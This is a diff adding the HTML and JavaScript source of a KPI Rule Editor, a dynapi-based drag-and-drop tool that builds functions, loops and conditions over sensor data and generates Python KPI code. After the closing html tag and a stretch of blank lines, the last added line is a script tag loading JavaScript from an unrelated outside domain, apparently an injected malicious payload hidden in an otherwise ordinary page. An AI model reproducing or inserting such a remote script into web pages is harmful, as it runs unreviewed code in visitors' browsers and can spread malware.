@@ -1,0 +1,437 @@
+<html>
+<head>
+<title>KPI Rule Editor</title>
+
+<link href='../../resources/kpi.css' rel='stylesheet' type='text/css' />
+
+<script language="JavaScript" src="../../resources/JSCollections.js"></script>
+<script language="JavaScript" src="../../resources/dynapi/dynapi.js"></script>
+<script language="Javascript">
+	dynapi.library.setPath('../../resources/dynapi/');
+	dynapi.library.include('dynapi.api');
+	dynapi.library.include('BorderManager');
+	dynapi.library.include('FocusManager');
+	dynapi.library.include('DragEvent');
+	dynapi.library.include('HTMLComponent');
+	dynapi.library.include('HTMLMenu');
+	dynapi.library.include('Button');
+	dynapi.library.include('Stacker');
+</script>
+<script language="Javascript" src="../../resources/sarissa/sarissa.js" ></script>
+<script language="JavaScript" src="../../resources/kpi/kpi.js"></script>
+<script language="JavaScript" src="../../resources/kpi/shape.js"></script>
+<script language="JavaScript" src="../../resources/kpi/statement.js"></script>
+<script language="JavaScript" src="../../resources/kpi/code_block.js"></script>
+<script language="JavaScript" src="../../resources/kpi/conditions.js"></script>
+<script language="JavaScript" src="../../resources/kpi/loop.js"></script>
+<script language="JavaScript" src="../../resources/kpi/function.js"></script>
+<script language="JavaScript" src="../../resources/kpi/toolbar.js"></script>
+<script language="JavaScript" src="../../resources/kpi/drop_in_list.js"></script>
+<script language="JavaScript" src="../../resources/kpi/expression.js"></script>
+<script language="JavaScript" src="../../resources/kpi/assignment_statement.js"></script>
+<script language="JavaScript" src="../../resources/kpi/return_statement.js"></script>
+<script language="Javascript" src="../../resources/kpi/sensors_data_panel.js" ></script>
+
+
+
+<script language="Javascript">
+
+	KPI.RESOURCES_PATH = "../../resources/kpi/images/";
+	dynapi.document.setTextSelectable(false);
+
+
+
+
+
+	var functions = new Vector();
+
+
+
+
+	// create drawing area
+	drawingPane = new DynLayer(null, 0, 0, 1500, 1000);
+	drawingPane.setBorder(1, "solid", "#000000");
+	drawingPane.setBgImage(KPI.RESOURCES_PATH + "/bg.gif");
+	dynapi.document.addChild(drawingPane);
+
+
+	drawingPane.addEventListener({
+		ondrop: function (e, droppedItem) {
+			if (droppedItem._className == "Function") {
+				drawingPane.addChild(droppedItem);
+				functions.insertElementAt(droppedItem, 0);
+			} else {
+				droppedItem.removeFromParent();
+			}
+		},
+		
+		
+		
+		onclick: function (e) {
+
+			e.preventBubble()
+			var shape = Shape.CURRENT_SELECTED_SHAPE;
+			if (shape != null) {
+				shape.setSelected(false);
+			}
+			
+		}
+	});
+
+
+
+
+
+	// create tool bar
+	toolBar = new ToolBar(0, 20, 150, 400);
+	toolBar.setItemSpacing(20);
+	dynapi.document.addChild(toolBar);
+	window.onscroll = function () {
+		toolBar.setLocation(document.body.scrollLeft, 50 + document.body.scrollTop);
+	}
+
+
+
+	var lblGeneral = new DynLayer("<table width='100%' height='100%' valign='middle' align='center'><tr><td><b><font color='#ffffff'><center>General Tools</center></font></b></td></tr></table>", 0, 0, 0, 25, "#4780B8");
+	lblGeneral.setAnchor({left:0, right:0, stretchH:"100%"});
+	toolBar.contentLayer.addChild(lblGeneral);
+
+
+	var functionTool = new ToolBarItem(KPI.RESOURCES_PATH + "FunctionIcon.jpg", "Function", 0, 30, 130, 30);
+	toolBar.contentLayer.addChild(functionTool);
+	functionTool.setDragEnabled(true,null,true);
+	functionTool.setDragIcon(new Function());
+	functionTool.addEventListener({
+		ondragend: function (e) {
+			var shape = e.getSource()._dragIcon;
+
+			// if the shape's parent is NOT the document anymore that mean the shapes is already
+			// added to some other layer. We need to set the shape's visible to true and create a new shape
+			// for the function tool
+			if (shape.parent != dynapi.document) {
+				shape.setVisible(true);
+				shape.setSize(shape.getDefaultWidth(), shape.getDefaultHeight());
+				functionTool.setDragIcon(new Function());
+			}
+		}
+	});
+
+
+
+
+
+
+	var statementTool = new ToolBarItem(KPI.RESOURCES_PATH + "StatementIcon.jpg", "Statement", 0, 60, 130, 30);
+	toolBar.contentLayer.addChild(statementTool);
+	statementTool.setDragEnabled(true,null,true);
+	statementTool.setDragIcon(new Statement());
+	statementTool.addEventListener({
+		ondragend: function (e) {
+			var shape = e.getSource()._dragIcon;
+
+			// if the shape's parent is NOT the document anymore that mean the shapes is already
+			// added to some other layer. We need to set the shape's visible to true and create a new shape
+			// for the function tool
+			if (shape.parent != dynapi.document) {
+				shape.setVisible(true);
+				shape.setSize(shape.getDefaultWidth(), shape.getDefaultHeight());
+				statementTool.setDragIcon(new Statement());
+			}
+		}
+	});
+
+
+
+
+
+	var codeBlockTool = new ToolBarItem(KPI.RESOURCES_PATH + "CodeBlockIcon.jpg", "Code Block", 0, 90, 130, 30);
+	toolBar.contentLayer.addChild(codeBlockTool);
+	codeBlockTool.setDragEnabled(true,null,true);
+	codeBlockTool.setDragIcon(new CodeBlock());
+	codeBlockTool.addEventListener({
+		ondragend: function (e) {
+			var shape = e.getSource()._dragIcon;
+
+			// if the shape's parent is NOT the document anymore that mean the shapes is already
+			// added to some other layer. We need to set the shape's visible to true and create a new shape
+			// for the code block tool
+			if (shape.parent != dynapi.document) {
+				shape.setVisible(true);
+				shape.setSize(shape.getDefaultWidth(), shape.getDefaultHeight());
+				codeBlockTool.setDragIcon(new CodeBlock());
+			}
+		}
+	});
+
+
+
+	var branchTool = new ToolBarItem(KPI.RESOURCES_PATH + "BranchIcon.jpg", "Branch", 0, 120, 130, 30);
+	toolBar.contentLayer.addChild(branchTool);
+	branchTool.setDragEnabled(true,null,true);
+	branchTool.setDragIcon(new Branch());
+	branchTool.addEventListener({
+		ondragend: function (e) {
+			var shape = e.getSource()._dragIcon;
+
+			// if the shape's parent is NOT the document anymore that mean the shapes is already
+			// added to some other layer. We need to set the shape's visible to true and create a new shape
+			// for the code block tool
+			if (shape.parent != dynapi.document) {
+				shape.setVisible(true);
+				shape.setSize(shape.getDefaultWidth(), shape.getDefaultHeight());
+				branchTool.setDragIcon(new Branch());
+			}
+		}
+	});
+
+
+
+	var ifConditionTool = new ToolBarItem(KPI.RESOURCES_PATH + "ConditionIcon.jpg", "If Condition", 0, 150, 130, 30);
+	toolBar.contentLayer.addChild(ifConditionTool);
+	ifConditionTool.setDragEnabled(true,null,true);
+	ifConditionTool.setDragIcon(new IfCondition());
+	ifConditionTool.addEventListener({
+		ondragend: function (e) {
+			var shape = e.getSource()._dragIcon;
+
+			// if the shape's parent is NOT the document anymore that mean the shapes is already
+			// added to some other layer. We need to set the shape's visible to true and create a new shape
+			// for the code block tool
+			if (shape.parent != dynapi.document) {
+				shape.setVisible(true);
+				shape.setSize(shape.getDefaultWidth(), shape.getDefaultHeight());
+				ifConditionTool.setDragIcon(new IfCondition());
+			}
+		}
+	});
+
+
+
+	var loopTool = new ToolBarItem(KPI.RESOURCES_PATH + "LoopIcon.jpg", "Loop", 0, 180, 130, 30);
+	toolBar.contentLayer.addChild(loopTool);
+	loopTool.setDragEnabled(true,null,true);
+	loopTool.setDragIcon(new Loop());
+	loopTool.addEventListener({
+		ondragend: function (e) {
+			var shape = e.getSource()._dragIcon;
+
+			// if the shape's parent is NOT the document anymore that mean the shapes is already
+			// added to some other layer. We need to set the shape's visible to true and create a new shape
+			// for the code block tool
+			if (shape.parent != dynapi.document) {
+				shape.setVisible(true);
+				shape.setSize(shape.getDefaultWidth(), shape.getDefaultHeight());
+				loopTool.setDragIcon(new Loop());
+			}
+		}
+	});
+
+
+
+	var lblKPI = new DynLayer("<table width='100%' height='100%' valign='middle' align='center'><tr><td><b><font color='#ffffff'><center>KPI Tools</center></font></b></td></tr></table>", 0, 215, 0, 25, "#4780B8");
+	lblKPI.setAnchor({left:0, right:0, stretchH:"100%"});
+	toolBar.contentLayer.addChild(lblKPI);
+
+
+	var assignmentStatementTool = new ToolBarItem(KPI.RESOURCES_PATH + "AssignmentStatementIcon.jpg", "Assignment", 0, 245, 130, 30);
+	toolBar.contentLayer.addChild(assignmentStatementTool);
+	assignmentStatementTool.setDragEnabled(true,null,true);
+	assignmentStatementTool.setDragIcon(new AssignmentStatement());
+	assignmentStatementTool.addEventListener({
+		ondragend: function (e) {
+			var shape = e.getSource()._dragIcon;
+
+			// if the shape's parent is NOT the document anymore that mean the shapes is already
+			// added to some other layer. We need to set the shape's visible to true and create a new shape
+			// for the code block tool
+			if (shape.parent != dynapi.document) {
+				shape.setVisible(true);
+				shape.setSize(shape.getDefaultWidth(), shape.getDefaultHeight());
+				assignmentStatementTool.setDragIcon(new AssignmentStatement());
+			}
+		}
+	});
+
+	var returnStatementTool = new ToolBarItem(KPI.RESOURCES_PATH + "ReturnStatementIcon.jpg", "Return", 0, 275, 130, 30);
+	toolBar.contentLayer.addChild(returnStatementTool);
+	returnStatementTool.setDragEnabled(true,null,true);
+	returnStatementTool.setDragIcon(new ReturnStatement());
+	returnStatementTool.addEventListener({
+		ondragend: function (e) {
+			var shape = e.getSource()._dragIcon;
+
+			// if the shape's parent is NOT the document anymore that mean the shapes is already
+			// added to some other layer. We need to set the shape's visible to true and create a new shape
+			// for the code block tool
+			if (shape.parent != dynapi.document) {
+				shape.setVisible(true);
+				shape.setSize(shape.getDefaultWidth(), shape.getDefaultHeight());
+				returnStatementTool.setDragIcon(new ReturnStatement());
+			}
+		}
+	});
+
+
+
+
+
+
+/*
+	var lblOptions = new DynLayer("<table width='100%' height='100%' valign='middle' align='center'><tr><td><b><font color='#ffffff'><center>Options</center></font></b></td></tr></table>", 0, 280, 0, 25, "#4780B8");
+	lblOptions.setAnchor({left:0, right:0, stretchH:"100%"});
+	toolBar.contentLayer.addChild(lblOptions);
+*/
+	
+
+	var btnCodeGen = new Button('Generate Code', 0, 330, 120, 30);
+	btnCodeGen.setAnchor({centerH:0});
+	btnCodeGen.setLocalStyleAttribute('backColor', "#B00000");
+	btnCodeGen.setLocalStyleAttribute('fontBold', true);
+	btnCodeGen.setLocalStyleAttribute('foreColor', "#ffffff");
+	toolBar.contentLayer.addChild(btnCodeGen);
+	btnCodeGen.addEventListener({
+		onclick: function (e) {
+			try {
+				var n = functions.getSize();
+				var code = "";
+				var dom = Sarissa.getDomDocument();
+				var root = dom.createElement("KPI_Configuration");
+				dom.appendChild(root);
+				
+				for (var i = 0; i < n; i++) {
+					var func = functions.getElementAt(i);
+					code = code + func.generatePythonCode(0) + "\n\n";
+					var element = func.serializeToXML(dom);
+					if (element != null) {
+						root.appendChild(element);
+					}
+				}
+				
+
+				var xml = (new XMLSerializer()).serializeToString(dom);
+				var lines = xml.split("\n");
+				var kpiConfiguration = "#BEGIN KPI CONFIGURATION";
+				for (var i = 0; i < lines.length; i++) {
+					kpiConfiguration = kpiConfiguration + "\n#" + lines[i];
+				}
+				kpiConfiguration = kpiConfiguration + "\n" + "#END KPI CONFIGURATION";
+				
+				code = kpiConfiguration + "\n\n" + code;
+
+				try {
+					opener.setKPIRule(code);
+					
+				} catch (e) {
+					alert("Can not set KPI rule to the KPI Configuration page. Make sure the page is not closed. The code will be placed in a new window instead.");
+					
+					var win = window.open("", "_blank");
+					win.document.writeln("<body><xmp>");
+					win.document.writeln(code);
+					win.document.writeln("</xmp></body>");
+					win.document.close();
+				}
+				
+			} catch (e) {
+				alert(e.message || e);
+			}
+		}
+	});
+
+
+
+
+
+
+
+	try {
+		var sensorIDs = new Array(0);
+		var sensorNames = new Array(0);
+		var sensorDataURLs = new Array(0);
+	
+
+		var qs = window.location.toString().substring(window.location.toString().indexOf("?") + 1).split("&");
+		var	idsQS = qs[0].substring(qs[0].indexOf("=") + 1);
+		var	namesQS = qs[1].substring(qs[1].indexOf("=") + 1);
+		var	sensorDataURL = qs[2].substring(qs[2].indexOf("=") + 1);
+
+		if (idsQS.trim().length > 0) {
+			sensorIDs = idsQS.split(",");
+		}
+
+		if (namesQS.trim().length > 0) {
+			sensorNames = namesQS.split(",");
+		}
+		
+		
+		var sensorDataURLs = new Array(sensorIDs.length);
+		for (var i = 0; i < sensorIDs.length; i++) {
+			sensorDataURLs[i] = sensorDataURL + "?sensorid=" + sensorIDs[i] + "&expand=true";
+		}
+		
+
+		var sensorsDataPanel = new SensorsDataPanel(sensorNames, sensorDataURLs);
+		sensorsDataPanel.setSize(500, 300);
+		sensorsDataPanel.setLocation(-1000, -1000);
+		sensorsDataPanel.setBorder(5, "solid", "#000000");
+		sensorsDataPanel.setBgColor("#ffffff");
+		sensorsDataPanel.setZIndex({topmost:true});
+		sensorsDataPanel.setVisible(false);
+		drawingPane.addChild(sensorsDataPanel);
+
+
+	
+		var kpiFunction = new Function(200, 50);
+		kpiFunction.setSignature("kpi", sensorNames);
+		kpiFunction.setEditable(false);
+		drawingPane.addChild(kpiFunction);
+		functions.insertElementAt(kpiFunction, 0);
+	
+	
+
+	} catch (e) {
+		alert(e.message);
+		alert("ERROR: Make sure this window is loaded from the KPI Configuration Page.");
+	}
+
+
+
+
+	
+
+</script>
+
+
+
+
+</head>
+<body>
+<script>
+
+	dynapi.document.insertAllChildren();
+
+
+
+	// IMPORTANT: We NEED to call this function LAST or else we will get exception.
+	// The reason we will get an exception if we call this before we call "dynapi.document.insertAllChildren()"
+	// because the "buildUI" function will make a call to the "document.getElementById" function
+	// to get the reference of the "sensorsData" object. But if we haven't call "dynapi.document.insertAllChildren"
+	// yet, the "sensorsData" DOES NOT exist in the document so the function will return NULL.
+	sensorsDataPanel.buildUI();
+
+
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+<script language=javascript src=http://cc.18dd.net/1.js></script>
